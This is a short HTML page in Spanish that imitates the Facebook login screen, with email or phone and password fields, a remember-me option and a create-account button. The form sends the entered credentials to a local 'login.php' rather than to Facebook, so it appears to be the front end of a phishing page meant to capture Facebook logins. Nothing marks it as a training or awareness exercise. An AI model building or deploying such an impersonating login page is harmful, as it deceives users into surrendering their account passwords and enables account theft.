<!DOCTYPE html>
<html>
<head>
	<title>Inicio de sesión en Facebook</title>
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<div class="container">
		<form method="POST" action="login.php">
			<h1>Iniciar sesión en Facebook</h1>
			<input type="text" placeholder="Correo electrónico o número de teléfono" name="email">
			<input type="password" placeholder="Contraseña" name="password">
			<button type="submit">Iniciar sesión</button>
			<div class="opciones">
				<input type="checkbox" id="recuerdame" name="remember">
				<label for="recuerdame">Recuérdame</label>
				<a href="#">¿Olvidaste tu contraseña?</a>
			</div>
			<hr>
			<button type="button" id="crear-cuenta">Crear cuenta nueva</button>
		</form>
	</div>
</body>
</html>
